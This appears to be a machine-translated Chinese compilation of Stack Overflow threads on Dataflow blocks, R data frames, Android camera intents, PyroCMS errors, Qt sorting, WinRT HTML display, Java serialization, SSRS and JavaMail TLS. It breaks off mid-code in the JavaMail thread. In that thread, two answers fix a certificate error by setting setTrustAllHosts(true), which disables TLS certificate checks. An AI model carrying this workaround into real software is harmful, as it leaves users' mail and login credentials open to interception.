有没有办法绕过完整的自定义数据流块？还是我误解了 BroadCastBlock 的工作原理？不幸的是，没有太多的文档可以详细介绍并涵盖用例。任何想法都受到高度赞赏。

* * *

## 回答 #1

> 赞同：35
> 
> 时间：2012-11-28T16:10:54.790

如果我对您的理解正确，您想要的可以通过一个简单的 来完成`BufferBlock`，它将通过谓词链接到您的所有目标块。您还可以（无条件地）将其链接到一个[`NullTarget`block](http://msdn.microsoft.com/en-us/library/hh462765%28v=vs.110%29.aspx)，以丢弃不匹配的项目。

就像是：

```
var forwarder = new BufferBlock<SomeType>();
forwarder.LinkTo(target1, item => matchesTarget1(item));
forwarder.LinkTo(target2, item => matchesTarget2(item));
forwarder.LinkTo(DataflowBlock.NullTarget<SomeType>()); 
```

这样，每个项目将被发送到第一个匹配的目标，如果有的话。

`BroadcastBlock`如果您想将每个项目发送到多个目标，或者如果您想在目标块不够快的情况下丢弃项目，则可能很有用。

使用`BroadcastBlock`，如果没有块接受它们，则项目可能会被丢弃（即使它们稍后可能能够接受）。但它不会随机丢弃项目，因此如果您的目标块没有`BoundedCapacity`设置，我认为您可以确定他们将获得所有他们不会拒绝的项目（例如，通过使用谓词 in `LinkTo()`）。

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2015-06-19T19:55:05.890

我发现接受的答案不正确。NullTarget 应该与它的谓词联系起来，即消费者的否定。否则，您可能会丢弃您想要使用的消息。

```
var forwarder = new BufferBlock<SomeType>();
forwarder.LinkTo(target1, item => matchesTarget1(item));
forwarder.LinkTo(target2, item => matchesTarget2(item));
forwarder.LinkTo(DataflowBlock.NullTarget<SomeType>(), item => !matchesTarget1(item) && !matchesTarget2(item)); 
```

# r - rbind data.frames 没有名字

> ID：13599197
> 
> 赞同：7
> 
> 时间：2012-11-28T06:36:28.983
> 
> 标签：r, dataframe, names, rbind

我试图弄清楚为什么`rbind`在加入没有名称的 data.frames 时该功能无法按预期工作。这是我的测试：

```
test <- data.frame(
            id=rep(c("a","b"),each=3),
            time=rep(1:3,2),
            black=1:6,
            white=1:6,
            stringsAsFactors=FALSE
            )

# take some subsets with different names
pt1 <- test[,c(1,2,3)]
pt2 <- test[,c(1,2,4)]

# method 1 - rename to same names - works
names(pt2) <- names(pt1)
rbind(pt1,pt2)

# method 2 - works - even with duplicate names
names(pt1) <- letters[c(1,1,1)]
names(pt2) <- letters[c(1,1,1)]
rbind(pt1,pt2)

# method 3 - works  - with a vector of NA's as names
names(pt1) <- rep(NA,ncol(pt1))
names(pt2) <- rep(NA,ncol(pt2))
rbind(pt1,pt2)

# method 4 - but... does not work without names at all?
pt1 <- unname(pt1)
pt2 <- unname(pt2)
rbind(pt1,pt2) 
```

这对我来说似乎有点奇怪。我错过了一个很好的理由为什么这不应该开箱即用？

**编辑以获取更多信息**

使用@JoshO'Brien 的建议`debug`，我可以将错误识别为在函数的此`if`语句部分期间发生`rbind.data.frame`

```
if (is.null(pi) || is.na(jj <- pi[[j]])) 
```

（这里的代码在线版本：[http](http://svn.r-project.org/R/trunk/src/library/base/R/dataframe.R) ://svn.r-project.org/R/trunk/src/library/base/R/dataframe.R开始于：“ *### 这里是 rbind 和 cbind 的方法。* ")

从单步执行程序来看，此时`pi`似乎没有设置 的值，因此程序尝试索引内置常量`pi`like`pi[[3]]`并出错。

据我所知，内部`pi`对象似乎没有设置，因为前面的行`clabs`已被初始化为`NULL`：

```
if (is.null(clabs)) clabs <- names(xi) else { #pi gets set here 
```

我很纠结，试图弄清楚这一点，但会随着它的组合而更新。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-28T07:57:18.973

因为`unname()`& 明确地将 NA 指定为列标题不是相同的操作。当列名都是 NA 时，an`rbind()`是可能的。由于`rbind()`采用数据框的名称/列名，因此结果不匹配，因此`rbind()`失败。

这里有一些代码可以帮助理解我的意思：

```
> c1 <- c(1,2,3)
> c2 <- c('A','B','C')
> df1 <- data.frame(c1,c2)
> df1
  c1 c2
1  1  A
2  2  B
3  3  C
> df2 <- data.frame(c1,c2) # df1 & df2 are identical
>
> #Let's perform unname on one data frame &
> #replacement with NA on the other
>
> unname(df1)
  NA NA
1  1  A
2  2  B
3  3  C
> tem1 <- names(unname(df1))
> tem1
NULL
>
> #Please note above that the column headers though showing as NA are null
>
> names(df2) <- rep(NA,ncol(df2))
> df2
  NA NA
1  1  A
2  2  B
3  3  C
> tem2 <- names(df2)
> tem2
[1] NA NA
> 
> #Though unname(df1) & df2 look identical, they aren't
> #Also note difference in tem1 & tem2
>
> identical(unname(df1),df2)
[1] FALSE
> 
```

我希望这有帮助。名称显示为`NA`每个，但两个操作不同。

因此，将列标题替换为的`NA`两个数据帧可以“rbound”，但没有任何列标题的两个数据帧（使用 实现`unname()`）不能。

# android - 捕获图像时出错

> ID：13599201
> 
> 赞同：0
> 
> 时间：2012-11-28T06:36:46.893
> 
> 标签：android, android-intent, android-camera

我想使用相机捕捉图像并想要图像路径。

我尝试以下代码，但出现错误。（我按照这个链接[Get Path of image from ACTION_IMAGE_CAPTURE Intent](https://stackoverflow.com/questions/4184951/get-path-of-image-from-action-image-capture-intent)）

这是我的代码。

**MainActivity.java**

```
public class MainActivity  extends Activity {
 private static final int CAMERA_REQUEST = 1888; 
    private ImageView imageView;
    private Uri mCapturedImageURI;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        this.imageView = (ImageView)this.findViewById(R.id.imageView1);
        Button photoButton = (Button) this.findViewById(R.id.button1);
        photoButton.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View v) {

                 String fileName = "temp.jpg";  
                 ContentValues values = new ContentValues();  
                 values.put(MediaStore.Images.Media.TITLE, fileName);  
                 mCapturedImageURI = getContentResolver().insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, values);  

                 Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);  
                 intent.putExtra(MediaStore.EXTRA_OUTPUT, mCapturedImageURI);  
                 startActivityForResult(intent, CAMERA_REQUEST);
            }
        });
    }

    protected void onActivityResult(int requestCode, int resultCode, Intent data) {  
        if (requestCode == CAMERA_REQUEST && resultCode == RESULT_OK) {  

             String[] projection = { MediaStore.Images.Media.DATA}; 
             Cursor cursor = managedQuery(mCapturedImageURI, projection, null, null, null); 
             int column_index_data = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA); 
             cursor.moveToFirst(); 
             String capturedImageFilePath = cursor.getString(column_index_data);

             Toast.makeText(getApplicationContext(), capturedImageFilePath.toString(), Toast.LENGTH_LONG).show();

        }  
    } 
} 
```

**activity_main.xml**

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="vertical" >

    <Button
        android:id="@+id/button1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="photo" >
    </Button>

    <ImageView
        android:id="@+id/imageView1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:src="@drawable/ic_launcher" >
    </ImageView>

</LinearLayout> 
```

**AndroidManifest.xml**

```
<uses-feature android:name="android.hardware.camera"></uses-feature>
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/> 
```

**错误**

```
java.lang.RuntimeException: Unable to resume activity {com.example.cameraupload/com.example.cameraupload.MainActivity}: java.lang.RuntimeException: Failure delivering result ResultInfo{who=null, request=1888, result=-1, data=null} to activity {com.example.cameraupload/com.example.cameraupload.MainActivity}: java.lang.NullPointerException 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T07:31:28.107

```
if (resultCode != RESULT_CANCELED) {
    if (requestCode == CAMERA_REQUEST) {

     String[] projection = { MediaStore.Images.Media.DATA };
      Cursor cursor = managedQuery(mCapturedImageURI, projection,                   null, null, null);
                int column_index_data = cursor
                        .getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
                cursor.moveToFirst();
                String capturedImageFilePath = cursor
                        .getString(column_index_data);

                Toast.makeText(getApplicationContext(),
                        capturedImageFilePath.toString(), Toast.LENGTH_LONG)
                        .show();

            }
        } 
```

你试试这个我想他们会帮助你..

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T10:21:57.267

最后我得到了Ans。

photoButton.setOnClickListener(new OnClickListener() {

```
 public void onClick(View v) {

           File file = new File(Environment.getExternalStorageDirectory()+"/test1.jpg");
            Uri outputFileUri = Uri.fromFile(file);
            Intent intent = new Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE);
            intent.putExtra(MediaStore.EXTRA_OUTPUT, outputFileUri);
            startActivityForResult(intent, 0);

        }
    });

protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        Log.i("MakeMachine", "requestCode:"+requestCode + ",resultCode: " + resultCode);

                        File file = new File(Environment.getExternalStorageDirectory()+"/test1.jpg");
                        if(file.exists()){
                            BitmapFactory.Options options = new BitmapFactory.Options();
                            options.inSampleSize = 4;
                            picFileName=Environment.getExternalStorageDirectory()+"/test.jpg";
                            Toast.makeText(getApplicationContext(), picFileName, Toast.LENGTH_LONG).show();
                            Bitmap bitmap = BitmapFactory.decodeFile(picFileName, options);
                            imageView.setImageBitmap(bitmap);
                            //imageView.setVisibility(View.VISIBLE);
                        }

    } 
```

# codeigniter - 500 pyrocms 用户模块中的内部服务器错误

> ID：13599206
> 
> 赞同：0
> 
> 时间：2012-11-28T06:36:57.607
> 
> 标签：codeigniter, webserver, php, pyrocms

我在 pyrocms 2.0.1 中有一个站点，除了用户模块外，它运行良好。当我从管理员单击管理用户时，它给了我 500 内部服务器错误，而且 usre 模块在本地服务器中的工作速度很慢。我们在数据库中有大约 5000 个用户。这里是配置文件[http://www.mypartyaid.com/info.php](http://www.mypartyaid.com/info.php)

这里出现在错误日志中的条目

错误 - 2012-11-29 04:07:08 --> 页面丢失：m/style/images/ui-bg_inset-soft_25_000000_1x100.png 错误 - 2012-11-29 04:07:08 --> 插件方法“baseuri " 在类 "Plugin_Url" 上不存在。错误 - 2012-11-29 04:07:59 --> 缺少页面：robots.txt 错误 - 2012-11-29 04:07:59 --> 类“Plugin_Url”上不存在插件方法“baseuri”。错误 - 2012-11-29 04:08:15 --> 类“Plugin_Url”上不存在插件方法“baseuri”。错误 - 2012-11-29 04:08:21 --> 页面丢失：m/style/images/ui-bg_inset-soft_25_000000_1x100.png 错误 - 2012-11-29 04:08:21 --> 插件方法“baseuri " 在类 "Plugin_Url" 上不存在。错误 - 2012-11-29 04:09:51 --> 页面缺失：m/style/images/ui-bg_inset-soft_25_000000_1x100.png 错误 - 2012-11-29 04:09：51 --> 类“Plugin_Url”上不存在插件方法“baseuri”。错误 - 2012-11-29 04:10:35 --> 类“Plugin_Url”上不存在插件方法“baseuri”。错误 - 2012-11-29 04:10:35 --> 类“Plugin_Url”上不存在插件方法“baseuri”。错误 - 2012-11-29 04:10:35 --> 类“Plugin_Url”上不存在插件方法“baseuri”。错误 - 2012-11-29 04:10:38 --> 类“Plugin_Url”上不存在插件方法“baseuri”。错误 - 2012-11-29 04:10:38 --> 类“Plugin_Url”上不存在插件方法“baseuri”。错误 - 2012-11-29 04:10:39 --> 严重性：通知 --> 未定义索引：城市 错误 - 2012-11-29 04:10:35 --> 类“Plugin_Url”上不存在插件方法“baseuri”。错误 - 2012-11-29 04:10:35 --> 类“Plugin_Url”上不存在插件方法“baseuri”。错误 - 2012-11-29 04:10:35 --> 类“Plugin_Url”上不存在插件方法“baseuri”。错误 - 2012-11-29 04:10:38 --> 类“Plugin_Url”上不存在插件方法“baseuri”。错误 - 2012-11-29 04:10:38 --> 类“Plugin_Url”上不存在插件方法“baseuri”。错误 - 2012-11-29 04:10:39 --> 严重性：通知 --> 未定义索引：城市 错误 - 2012-11-29 04:10:35 --> 类“Plugin_Url”上不存在插件方法“baseuri”。错误 - 2012-11-29 04:10:35 --> 类“Plugin_Url”上不存在插件方法“baseuri”。错误 - 2012-11-29 04:10:35 --> 类“Plugin_Url”上不存在插件方法“baseuri”。错误 - 2012-11-29 04:10:38 --> 类“Plugin_Url”上不存在插件方法“baseuri”。错误 - 2012-11-29 04:10:38 --> 类“Plugin_Url”上不存在插件方法“baseuri”。错误 - 2012-11-29 04:10:39 --> 严重性：通知 --> 未定义索引：城市 类“Plugin_Url”上不存在。错误 - 2012-11-29 04:10:35 --> 类“Plugin_Url”上不存在插件方法“baseuri”。错误 - 2012-11-29 04:10:38 --> 类“Plugin_Url”上不存在插件方法“baseuri”。错误 - 2012-11-29 04:10:38 --> 类“Plugin_Url”上不存在插件方法“baseuri”。错误 - 2012-11-29 04:10:39 --> 严重性：通知 --> 未定义索引：城市 类“Plugin_Url”上不存在。错误 - 2012-11-29 04:10:35 --> 类“Plugin_Url”上不存在插件方法“baseuri”。错误 - 2012-11-29 04:10:38 --> 类“Plugin_Url”上不存在插件方法“baseuri”。错误 - 2012-11-29 04:10:38 --> 类“Plugin_Url”上不存在插件方法“baseuri”。错误 - 2012-11-29 04:10:39 --> 严重性：通知 --> 未定义索引：城市 . 错误 - 2012-11-29 04:10:39 --> 严重性：通知 --> 未定义索引：城市 . 错误 - 2012-11-29 04:10:39 --> 严重性：通知 --> 未定义索引：城市

![在此处输入图像描述](../Images/9ec10d56c12dcdd7d264aea4723bcc76.png)

服务器错误日志

[Thu Nov 29 00:29:33 2012] [warn] [client 141.101.99.77] mod_fcgid: stderr: PHP Warning: date(): 依赖系统的时区设置是不安全的。您*需要*使用 date.timezone 设置或 date_default_timezone_set() 函数。如果您使用了这些方法中的任何一种，但仍然收到此警告，您很可能拼错了时区标识符。我们在第 134 行的 /var/www/vhosts/mypartyaid.com/httpdocs/m/post.php 中为 'EST/-5.0/no DST' 选择了 'America/New_York'，参考：[http://www.mypartyaid .com/m/post.php?pid=80](http://www.mypartyaid.com/m/post.php?pid=80)

[Thu Nov 29 00:32:01 2012] [warn] [client 108.162.222.7] mod_fcgid：读取数据超时 45 秒，参考：[http ://www.mypartyaid.com/admin](http://www.mypartyaid.com/admin)

[Thu Nov 29 00:32:01 2012] [error] [client 108.162.222.7] 脚本头过早结束：index.php，引用：[http ://www.mypartyaid.com/admin](http://www.mypartyaid.com/admin)

[Thu Nov 29 00:35:42 2012] [warn] [client 108.162.222.7] mod_fcgid：读取数据超时 45 秒，参考：[http ://www.mypartyaid.com/admin](http://www.mypartyaid.com/admin)

[Thu Nov 29 00:35:42 2012] [error] [client 108.162.222.7] 脚本头过早结束：index.php，引用者：[http ://www.mypartyaid.com/admin](http://www.mypartyaid.com/admin)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T15:34:22.993

500 几乎总是表示致命错误，但活动站点显然不想吐出可能导致您的用户发现他们可以用来破解站点的信息的调试数据。

检查您的 PHP 日志，答案应该很明显。如果您无法从中解决问题，请编辑您的问题以包含日志中的错误消息并对此问题发表评论，以便我可以更新我的答案。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-12T04:43:06.283

该问题最终不是服务器错误，而是默认用户模型效率低下。该模块将用户表拆分为两个不同的表`default_profiles`和`default_users`. 然后使用该`user_id`字段连接两个表。

问题是 CMS 中许多生成的 SQL 语句运行复杂的连接语句，`default_profiles`导致查询时间随着用户表的大小线性增加。

我在该字段上放置了一个索引，`user_id`该网站主页的查询时间从 8 秒变为不到 0.001 秒。因此，向该字段添加索引将使您的用户表能够正确缩放。

# qt - Qt。在重度应用中重新定义 QString::compare

> ID：13599210
> 
> 赞同：-1
> 
> 时间：2012-11-28T06:37:08.113
> 
> 标签：qt, sorting

我的任务是在 QStandardItemModel 中自定义排序项目。默认情况下，用于一系列行

```
 text1
 text11
 text12
 text100
 text110
 text120
 text1110 
```

函数`QStandardItemModel::sort()`将其排序为

```
 text1
 text100
 text11
 text110
 text1110
 text12
 text120 
```

我希望那会是

```
 text1
 text11
 text12
 text100
 text110
 text120
 text1110 
```

为此，我`int QString::compare(const QString &s) const` 在分隔 `compare.cpp` 文件中重载了函数。

```
 int QString::compare(const QString &s) const
   {
       QString strL = "";
       strL.append(this);
       QString strR = "";
       strR.append(s);

       QStringList list = strL.split(QRegExp("\\D+"),QString::SkipEmptyParts);
       foreach (QString num, list) {
           strL.replace(num, QString("%1").arg(num,10,'0'));
       }

       list = strR.split(QRegExp("\\D+"),QString::SkipEmptyParts);
       foreach (QString num, list) {
           strR.replace(num, QString("%1").arg(num,10,'0'));
       }

       return strL.localeAwareCompare(strR);
   } 
```

使用 in 运算符 `virtual bool operator< ( const QStandardItem & other ) const`。

这样的功能`compare`可以在单独的文件中重新定义，在*.pro中添加很简单，简单的应用程序就会找到它的实现。但是对于更困难的应用程序，这是不可能的。请告诉我为什么？

示例：[代码](https://www.dropbox.com/s/pdf0q8tzzc0yw1k/CustomSorting.tbz2)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T14:24:53.097

`QStandardItemModel`您不想直接使用 a ，而是将其包装在`QSortFilterProxyModel`. 此类专为您描述的情况而设计 - 当您想要实现自定义排序或过滤行为时。只需实现该`QSortFilterProxyModel::lessThan`方法以反映所需的行为。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T06:59:48.283

`QStandardItemModel`有虚函数`sort(int column, Qt::SortOrder order = Qt::AscendingOrder)`。`QStandardItemModel`我认为子类化和重新实现`sort`功能会更容易。

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2012-11-29T06:34:30.490

我做到了！

当我说“繁重的应用程序”时，我的意思是应用程序，它包含并绑定了许多其他插件和库。为此，我创建了一个名为 QStringCompare 的新库，其中包含一个文件 compare.cpp 和我的新比较定义：

```
#include <QStringList>
#include <QRegExp>
int Q_DECL_EXPORT QString::compare(const QString &s) const
{
    QString strL = "";
    strL.append(this);
    QString strR = "";
    strR.append(s);

    QStringList list = strL.split(QRegExp("\\D+"),QString::SkipEmptyParts);
    foreach (QString num, list) {
        strL.replace(num, QString("%1").arg(num,10,'0'));
    }

    list = strR.split(QRegExp("\\D+"),QString::SkipEmptyParts);
    foreach (QString num, list) {
        strR.replace(num, QString("%1").arg(num,10,'0'));
    }

    return strL.localeAwareCompare(strR);
} 
```

并将 QStringCompare.lib 链接到我项目的主要应用程序的 *.pro 。通常不需要在 *.h 文件中声明它。所有其他插件都继承了这个重新定义。实验表明，有必要链接到主应用程序。就这样。

我的推理可能是错误的，但它适用于linux和windows。

这是[QStringCompare.libs](https://www.dropbox.com/s/3n7xhz5hkekuxxy/QStringCompare.tbz2)的来源。你可以试试。

# iphone - 表格视图中的触摸事件

> ID：13599214
> 
> 赞同：0
> 
> 时间：2012-11-28T06:37:24.800
> 
> 标签：iphone, ios

```
 UIView 
              UITableView(T1)            UITableView(T2) 
```

在 T1 中显示一些曲目，在 T2 中显示带有按钮和标签的行。当我们单击 T1 中的轨道（表格行）时，它必须在所选行的顶部生成一个图像，然后我们可以将生成的图像移动到屏幕的任何位置，最后如果我们将该图像放在 T2 行中，它必须适合它已经下降的 T2 行。当我们单击 T1 中的行时，这里正在生成图像，我可以将生成的图像移动到屏幕的任何位置，但是当我放到 T2 行时，它不会添加到 T2 行。

我们如何在 T2 行中添加生成的图像。

任何人都可以提供代码或想法。

提前致谢。

# xaml - 在 xaml 中显示 html

> ID：13599216
> 
> 赞同：0
> 
> 时间：2012-11-28T06:37:28.817
> 
> 标签：xaml, windows-runtime, winrt-xaml, windows-store-apps

我浪费了几个小时来寻找答案，我很伤心，因为我没有找到任何有用的东西。我在云中有一个 CMS，它为 www 站点和我的新 Windows 商店应用程序等不同设备提供内容。我想使用 html 格式。我已经在 c# 和 xaml 中创建了应用程序，我想知道如何显示 html

我很高兴，因为我找到了[http://nuget.org/packages/RichTextBlock.Html2Xaml](http://nuget.org/packages/RichTextBlock.Html2Xaml)但我无法让它工作。我得到空白页。没有文字，没有错误，什么都没有。

有人可以告诉我如何在我的应用程序中显示 html 吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T06:42:24.020

使用 WebView/WebViewBrush 或使用 HTML Agility Pack 并自己实现样式/渲染。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-24T14:33:26.933

在 WinRt 应用程序中，您可以通过以下方式显示 html 代码：

*   使用带有 NavigateToString("html content") 的 WebView
*   使用 WebViewBrush 并将其显示在矩形中
*   如果您有本地的 .html 文件 - 您可以使用`myWebview.Navigate(new Uri("ms-appx-web:///" + myPath));`
*   [您可以通过我在这里](https://stackoverflow.com/questions/10869318/taking-web-page-screen-shot-in-windows-8-metro-app/17276603#17276603)描述的方法制作网页截图并将其作为图片打开。

有关详细信息，请参阅[WebView 控件示例](http://code.msdn.microsoft.com/windowsapps/XAML-WebView-control-sample-58ad63f7)

# java - 如何摆脱 InvalidClassException SerialVersionUID？

> ID：13599217
> 
> 赞同：8
> 
> 时间：2012-11-28T06:37:29.380
> 
> 标签：java, serialization, serialversionuid

我在数据库中保存了一个 java 对象，几天后我更改了我的 jre 版本。现在，当我尝试读取同一个对象时，出现以下异常：

```
Exception in thread "main" java.io.InvalidClassException:
SerializeMe; local class incompatible: stream classdesc
serialVersionUID = -6377573678240024862, local class serialVersionUID = -8204757486033751616 
```

我怎样才能摆脱这个，我怎样才能得到保存的对象？

请帮我。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-28T06:43:23.150

如果您可以影响此类的源代码并且 JRE 只是发生了变化，那么您很可能仍然可以反序列化由旧 JVM 序列化的对象。只需在要反序列化的类中定义以下字段：

```
private static final long serialVersionUID = -6377573678240024862L; 
```

# reporting-services - 创建报表时看不到“报表数据窗格”

> ID：13599228
> 
> 赞同：30
> 
> 时间：2012-11-28T06:38:11.907
> 
> 标签：reporting-services, reportingservices-2005

创建报告时我看不到“报告数据窗格”。我已经尝试过shortcurt ++ `Ctrl`，并在“查看”菜单中查找报告数据。我正在使用 Microsoft Visual Studio 2005，并且打开了我的报告。我看到的只是数据集。`Shift``D`

我已经尝试过研究，但我看到的都是相同的程序。

* * *

## 回答 #1

> 赞同：51
> 
> 时间：2016-04-24T05:59:19.987

*对于现在*面临问题的用户，使用***Microsoft Visual Studio 2012 Shell (Integrated)***、*Business Intelligence Development Studio* / *SQL Server Data Tools*，如果您发现***报表数据***窗格*丢失*或您不小心将其关闭，请执行以下操作：

1.  单击报表的“*设计*”或报表的“*设计*”*窗格*
2.  现在在顶部的“*菜单栏”中，单击**“查看”>“报告数据”*

## 笔记

如果您直接转到“*菜单栏*”而不单击报表的*设计视图*（假设您单击“*解决方案资源管理器*”窗格中的某处），然后在菜单栏中，您尝试导航到
*“查看”* >“？？？ ” ? 您不会看到“*报告数据*”选项可用

**看到不同**

*无法使用*

[![在此处输入图像描述](../Images/d489e0ae784e3e227ac73a3bef17f68c.png)](https://i.stack.imgur.com/cFw8g.png)

* * *

***可用的 ：***

[![在此处输入图像描述](../Images/dbd91ec27d456189f44ebbd36283d02f.png)](https://i.stack.imgur.com/qzxZK.png)

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2017-06-21T04:21:25.440

1）打开大写锁定

2) CTRL + ALT + D

由于某种原因，必须是大写字母 D。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-28T08:48:06.670

“报表数据”窗格仅在 SQL Server 2008 之后才存在。当您在 BIDS 中打开报表时，在 2005 年您将拥有三个选项卡，而不是在 2008 年看到的两个选项卡。在 2008 年，您会看到“设计”和“预览”选项卡。在 2005 年，三个选项卡是数据、布局和预览。**数据**选项卡是您要查找的“报告数据窗格” 。

# linux - 使用 mv linux 命令查询

> ID：13599229
> 
> 赞同：0
> 
> 时间：2012-11-28T06:38:15.280
> 
> 标签：linux

我使用了以下 linx 命令：

```
mv RegisteredOutputs.msg registered_outputs.tcl 
```

我的意图是实现以下目标：

```
mv RegisteredOutputs.msg registered_outputs.msg 
```

我发出命令的目录已经有一个名为`registered_outputs.tcl`.

到目前为止，您可能已经弄清楚我的问题是什么。`registered_outputs.tcl`被覆盖。有什么办法可以恢复吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T06:52:21.543

您总是要做的第一件事：启动一个 live CD/USB，以便您的分区以只读方式安装，以避免重复使用驱动器上的这些空间。一旦另一个文件使用该盘片空间，数据就消失了。

由于 Linux ext3 文件系统的工作方式，它实际上会在删除时将 inode 数据清零，从而无法恢复。但是，这是用于删除的，我不知道是否同样适用于覆盖现有文件。希望你感到幸运。

[请参阅本指南](http://www.xs4all.nl/~carlo17/howto/undelete_ext3.html) ，了解如何在 ext3 上恢复已删除的文件

资源：

[恢复被覆盖的文件](https://superuser.com/questions/211301/recovery-of-overwritten-file)

# java - 没有 ssl 的 Java 邮件 - PKIX 路径构建失败：

> ID：13599234
> 
> 赞同：6
> 
> 时间：2012-11-28T06:38:26.233
> 
> 标签：java, smtp, jakarta-mail, starttls

我正在使用 java 邮件通过 smtp 发送电子邮件。下面给出的 smtp 设置：

```
 Properties props = new Properties();
        Object put = props.put("mail.smtp.host", smtpHost);
        props.put("mail.smtp.user", smtpUser);
        props.put("mail.smtp.auth", true);
        props.put("mail.debug", mailDebug);
        props.put("mail.smtp.port", port); 
```

已通过使用上述详细信息远程登录到我的 smtpHost 验证了 smtp 凭据。但是，当我在 java 邮件中使用上述设置时，出现以下异常。

```
 250-AUTH PLAIN LOGIN
        250-STARTTLS
        250 HELP
        DEBUG SMTP: Found extension "SIZE", arg "52428800"
        DEBUG SMTP: Found extension "8BITMIME", arg ""
        DEBUG SMTP: Found extension "PIPELINING", arg ""
        DEBUG SMTP: Found extension "AUTH", arg "PLAIN LOGIN"
        DEBUG SMTP: Found extension "STARTTLS", arg ""
        DEBUG SMTP: Found extension "HELP", arg ""
        DEBUG SMTP: Attempt to authenticate
        DEBUG SMTP: check mechanisms: LOGIN PLAIN DIGEST-MD5 NTLM
        DEBUG SMTP: AUTH LOGIN command trace suppressed
        DEBUG SMTP: AUTH LOGIN failed
        Nov 29, 2012 11:54:40 AM com.Test main
        SEVERE: null
        javax.mail.AuthenticationFailedException: 535 Incorrect authentication data 
```

当我添加该行时：

```
 props.put("mail.smtp.starttls.enable", false); 
```

它再次生成相同的身份验证失败异常。

如果我将**mail.smtp.starttls.enable**设置为**true**，则身份验证成功，但出现以下异常：

```
 220 TLS go ahead
     Nov 28, 2012 5:32:36 PM com.Test main
     SEVERE: null
     javax.mail.MessagingException: Could not convert socket to TLS;
     nested exception is:
    javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target
    at com.sun.mail.smtp.SMTPTransport.startTLS(SMTPTransport.java:1918)
    at com.sun.mail.smtp.SMTPTransport.protocolConnect(SMTPTransport.java:652)
    at javax.mail.Service.connect(Service.java:317) 
```

在浏览了有关第二个异常的各种论坛主题后，我运行了 InstallCert 程序来获取服务器的自签名证书。**InstallCert**引发以下异常：

```
 Opening connection to mydomain.com.au:443...
            Starting SSL handshake...
            javax.net.ssl.SSLException: Unrecognized SSL message, plaintext connection?
                    at sun.security.ssl.InputRecord.handleUnknownRecord(InputRecord.java:542)
                    at sun.security.ssl.InputRecord.read(InputRecord.java:374)
                    at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:850)
                    at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1190)
                    at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1217)
                    at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1201)
                    at InstallCert.main(InstallCert.java:100)
            Could not obtain server certificate chain 
```

因此，看起来我的服务器没有 ssl，但启用了 starttls。将带有 STARTTLS 的邮件发送到没有 ssl 的服务器的正确参数是什么？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-28T08:06:14.547

[这个 JavaMail FAQ 条目](http://www.oracle.com/technetwork/java/javamail/faq/index.html#installcert)应该会有所帮助。

尝试像这样使用 MailSSLSocketFactory：

```
 MailSSLSocketFactory sf = new MailSSLSocketFactory();
  sf.setTrustAllHosts(true);
  props.put("mail.smtp.ssl.socketFactory", sf); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-05-16T07:10:20.790

为我工作`:)`

```
Properties props = new Properties();
        props.put("mail.transport.protocol", "smtp");
        props.put("mail.smtp.host", "smtp.companydomain.biz"); // 
        props.put("mail.smtp.auth", "true");
        props.put("mail.debug", "true"); 
        props.put("mail.smtp.starttls.enable", "true");`enter code here`
        props.put("mail.smtp.port", "25");
        props.put("mail.smtp.socketFactory.port", "25");
        props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
        props.put("mail.smtp.socketFactory.fallback", "true");

        MailSSLSocketFactory sf = null;
        try {
            sf = new MailSSLSocketFactory();
        } catch (GeneralSecurityException e1) {
            // TODO Auto-generated catch block
            e1.printStackTrace();
        }
        sf.setTrustAllHosts(true);
        props.put("mail.smtp.ssl.socketFactory", sf);

        Session mailSession = Session.getInstance(props, new javax.mail.Authenticator() {

            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication("mail@companydomain.biz", "password");
            }
        });

        mailSession.setDebug(true); // Enable the debug mode

        Message msg = new MimeMessage( mailSession );

        //--[ Set the FROM, TO, DATE and SUBJECT fields
        try {
            msg.setFrom( new InternetAddress( "mail@companydomain.biz" ) );
        } catch (AddressException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (MessagingException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        try {
            msg.setRecipients( Message.RecipientType.TO,InternetAddress.parse("myemailid@companydomain.biz") );
        } catch (AddressException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
